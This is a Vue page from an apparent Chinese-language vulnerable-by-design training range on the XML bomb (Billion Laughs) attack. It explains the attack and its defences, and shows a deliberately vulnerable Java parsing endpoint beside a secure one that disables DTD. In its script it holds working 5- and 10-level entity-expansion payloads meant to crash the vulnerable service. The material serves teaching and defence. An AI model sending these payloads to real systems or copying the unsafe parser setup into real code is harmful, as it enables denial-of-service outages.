<template>
  <div class="root-div">
    <div class="vuln-info">
      <div class="header-div">XML 炸弹漏洞（Billion Laughs）</div>
      <div class="body-div">
        <el-tabs v-model="activeName" @tab-click="handleClick">
          <el-tab-pane label="漏洞描述" name="first">
            <div class="vuln-detail">
              XML 炸弹（Billion Laughs / 实体扩展 DoS）是一种利用 XML 实体递归定义，在解析时触发指数级实体扩展，从而耗尽内存或 CPU 的拒绝服务攻击。攻击者在 DTD 中定义多层嵌套实体（如 &lol9; 展开为大量 &lol8;，逐层展开），解析器会按实体引用展开，导致内存暴涨甚至 OOM。
            </div>
          </el-tab-pane>
          <el-tab-pane label="漏洞危害" name="second">
            <div class="vuln-detail">
              1. 拒绝服务（DoS）：单次请求即可导致服务端内存耗尽或长时间 CPU 占用<br/>
              2. 资源耗尽：影响同一进程内的其他请求，甚至拖垮整机<br/>
              3. 攻击成本低：payload 体积小，易于在文件上传、API 入参等场景投递<br/>
              4. 影响范围：所有在默认配置下解析 XML 的应用（含 SOAP、配置文件、上传 XML 等）
            </div>
          </el-tab-pane>
          <el-tab-pane label="安全编码" name="third">
            <div class="vuln-detail">
              【必须】禁用 DTD（最彻底）<br/>
              1. 设置 disallow-doctype-decl 为 true，禁止 DTD 声明与实体定义<br/>
              <br/>
              【必须】禁用外部实体与外部 DTD<br/>
              1. 关闭 external-general-entities、external-parameter-entities、load-external-dtd<br/>
              <br/>
              【建议】限制实体扩展（若无法禁用 DTD）<br/>
              1. 限制实体展开深度或总大小；设置解析超时<br/>
              2. 使用流式解析或安全配置的解析库
            </div>
          </el-tab-pane>
          <el-tab-pane label="参考文章" name="fourth">
            <div class="vuln-detail">
              <a href="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing" target="_blank" style="text-decoration: underline;">OWASP XXE（含实体扩展）</a><br/>
              <a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html" target="_blank" style="text-decoration: underline;">XML 安全防护速查表</a><br/>
              <a href="https://en.wikipedia.org/wiki/Billion_laughs_attack" target="_blank" style="text-decoration: underline;">Billion Laughs（维基）</a>
            </div>
          </el-tab-pane>
        </el-tabs>
      </div>
    </div>
    <div class="code-demo">
      <el-row :gutter="20" class="grid-flex">
        <el-col :span="12">
          <div class="grid-content bg-purple">
            <el-row type="flex" justify="space-between" align="middle">
              漏洞代码 - 默认配置解析（允许实体扩展）
              <el-button type="danger" round size="mini" @click="showVulnDialog">去测试</el-button>
            </el-row>
            <pre v-highlightjs><code class="java">/**
 * XML 炸弹漏洞 - 漏洞代码
 * 默认配置允许 DTD 与实体扩展
 */
@PostMapping("/vuln")
public Result xmlBombVulnerable(@RequestBody String xmlContent) {
    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
    DocumentBuilder builder = factory.newDocumentBuilder();
    Document doc = builder.parse(new InputSource(new StringReader(xmlContent)));
    // 实体扩展在此发生，炸弹 payload 会导致内存暴涨
    String rootName = doc.getDocumentElement().getNodeName();
    int contentLength = doc.getDocumentElement().getTextContent().length();
    return Result.success("解析成功，内容长度: " + contentLength);
}</code></pre>
          </div>
        </el-col>
        <el-col :span="12">
          <div class="grid-content bg-purple">
            <el-row type="flex" justify="space-between" align="middle">
              安全代码 - 禁用 DTD
              <el-button type="success" round size="mini" @click="showSecDialog">去测试</el-button>
            </el-row>
            <pre v-highlightjs><code class="java">/**
 * XML 炸弹漏洞 - 安全代码
 * 禁用 DTD，从根本上避免实体扩展
 */
@PostMapping("/sec")
public Result xmlBombSecure(@RequestBody String xmlContent) {
    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
    factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
    factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
    factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
    DocumentBuilder builder = factory.newDocumentBuilder();
    Document doc = builder.parse(new InputSource(new StringReader(xmlContent)));
    return Result.success("解析成功");
}</code></pre>
          </div>
        </el-col>
      </el-row>
    </div>

    <el-dialog title="XML 炸弹漏洞测试" :visible.sync="vulnDialogVisible" class="center-dialog" width="800px">
      <div style="text-align: left; color: red; font-style: italic;">
        说明：<br>
        1. 【正常】简单 XML，解析后内容长度很小<br>
        2. 【攻击】5 层炸弹：约 3 万字符，可先试看解析结果与耗时，再对比 10 层<br>
        3. 【攻击】10 层炸弹：指数级膨胀，多请求几次即可导致服务内存耗尽或宕机，请仅在靶场环境测试。
      </div>
      <el-form class="demo-form-inline">
        <el-form-item label="选择 Payload">
          <el-select v-model="vulnForm.selectedPayload" placeholder="请选择" @change="updateVulnPayload" style="width: 100%">
            <el-option label="【正常】简单 XML" value="normal" />
            <el-option label="【攻击】XML 炸弹（5 层 / 15 倍扩展）— 可对比效果" value="bomb5" />
            <el-option label="【攻击】XML 炸弹（10 层 / 15 倍扩展，可致服务宕机）" value="bomb" />
          </el-select>
        </el-form-item>
        <el-form-item label="XML 内容">
          <el-input v-model="vulnForm.xmlContent" type="textarea" :rows="8" placeholder="请输入 XML" />
        </el-form-item>
        <el-form-item>
          <el-button type="primary" @click="testVulnerable">提交测试</el-button>
        </el-form-item>
      </el-form>
      <div v-if="vulnForm.result" class="result-display">
        <h4>解析结果：</h4>
        <div class="result-text">
          <pre>{{ vulnForm.result }}</pre>
        </div>
      </div>
    </el-dialog>

    <el-dialog title="XML 炸弹安全防护测试" :visible.sync="secDialogVisible" class="center-dialog" width="800px">
      <div style="text-align: left; color: green; font-style: italic;">
        说明：<br>
        1. 安全代码已禁用 DTD，含 DTD 的 XML（含炸弹）将被拒绝解析。<br>
        2. 可选用与漏洞测试相同的 10 层 / 15 倍扩展炸弹 payload，验证会被拒绝；【正常】无 DTD 的 XML 应解析成功。
      </div>
      <el-form class="demo-form-inline">
        <el-form-item label="选择 Payload">
          <el-select v-model="secForm.selectedPayload" placeholder="请选择" @change="updateSecPayload" style="width: 100%">
            <el-option label="【正常】简单 XML（无 DTD）- 应成功" value="normal" />
            <el-option label="【攻击】XML 炸弹（10 层 / 15 倍扩展）- 应被拦截" value="bomb" />
          </el-select>
        </el-form-item>
        <el-form-item label="XML 内容">
          <el-input v-model="secForm.xmlContent" type="textarea" :rows="8" placeholder="请输入 XML" />
        </el-form-item>
        <el-form-item>
          <el-button type="primary" @click="testSecure">提交测试</el-button>
        </el-form-item>
      </el-form>
      <div v-if="secForm.result" class="result-display">
        <h4>解析结果：</h4>
        <div class="result-text">
          <pre>{{ secForm.result }}</pre>
        </div>
      </div>
    </el-dialog>
  </div>
</template>

<script>
import { xmlBombVulnerable, xmlBombSecure } from '@/api/xml'

export default {
  data() {
    return {
      activeName: 'first',
      vulnDialogVisible: false,
      secDialogVisible: false,
      vulnForm: {
        selectedPayload: '',
        xmlContent: '',
        result: ''
      },
      secForm: {
        selectedPayload: '',
        xmlContent: '',
        result: ''
      }
    }
  },
  methods: {
    handleClick() {},
    showVulnDialog() {
      this.vulnDialogVisible = true
      this.vulnForm.selectedPayload = ''
      this.vulnForm.xmlContent = ''
      this.vulnForm.result = ''
    },
    showSecDialog() {
      this.secDialogVisible = true
      this.secForm.selectedPayload = ''
      this.secForm.xmlContent = ''
      this.secForm.result = ''
    },
    updateVulnPayload() {
      const payloads = this.getPayloads()
      this.vulnForm.xmlContent = payloads[this.vulnForm.selectedPayload] || ''
    },
    updateSecPayload() {
      const payloads = this.getPayloads()
      this.secForm.xmlContent = payloads[this.secForm.selectedPayload] || ''
    },
    testVulnerable() {
      if (!this.vulnForm.xmlContent || !this.vulnForm.xmlContent.trim()) {
        this.$message.warning('请输入 XML 内容')
        return
      }
      xmlBombVulnerable(this.vulnForm.xmlContent)
        .then(res => {
          this.vulnForm.result = res.data
        })
        .catch(err => {
          this.vulnForm.result = '解析失败: ' + (err.msg || err.message || '未知错误')
        })
    },
    testSecure() {
      if (!this.secForm.xmlContent || !this.secForm.xmlContent.trim()) {
        this.$message.warning('请输入 XML 内容')
        return
      }
      xmlBombSecure(this.secForm.xmlContent)
        .then(res => {
          this.secForm.result = res.data
        })
        .catch(err => {
          this.secForm.result = '安全策略拦截或解析失败: ' + (err.msg || err.message || '未知错误')
        })
    },
    getPayloads() {
      return {
        normal: `<?xml version="1.0" encoding="UTF-8"?>
<root>
  <message>Hello, this is normal XML.</message>
</root>`,
        bomb5: `<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
]>
<lolz>&lol5;</lolz>`,
        bomb: `<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
  <!ENTITY lol10 "&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;">
]>
<lolz>&lol10;</lolz>`
      }
    }
  }
}
</script>

<style scoped>
.vuln-info {
  border-radius: 10px;
  margin-left: 20px;
  margin-right: 20px;
  margin-bottom: 20px;
  margin-top: 10px;
}
.header-div {
  font-size: 24px;
  color: #409EFF;
  font-weight: bold;
  padding: 10px;
  border-bottom: 1px solid #ccc;
}
.body-div {
  padding: 10px;
  font-family: Arial, sans-serif;
  font-size: 14px;
}
.vuln-detail {
  background-color: #dce9f8;
  padding: 10px;
}
.code-demo {
  margin: 20px;
  border-top: 1px solid #ccc;
  padding-top: 20px;
}
pre code { font-size: 12px; }
.el-row { margin-bottom: 20px; }
.el-col { border-radius: 4px; }
.bg-purple { background: #d3dce6; }
.grid-content { border-radius: 4px; height: 100%; padding: 10px; }
.grid-flex { display: flex; align-items: stretch; }
.center-dialog { text-align: center; margin: 0 auto; }
.demo-form-inline { text-align: left; }
.result-display { margin-top: 20px; text-align: center; }
.result-display h4 { text-align: left; margin-bottom: 10px; }
.result-text {
  text-align: left;
  background-color: #f5f7fa;
  padding: 10px;
  border-radius: 4px;
  max-height: 300px;
  overflow: auto;
}
.result-text pre {
  margin: 0;
  white-space: pre-wrap;
  word-wrap: break-word;
  font-family: Consolas, Monaco, 'Andale Mono', monospace;
  font-size: 12px;
  line-height: 1.5;
}
</style>
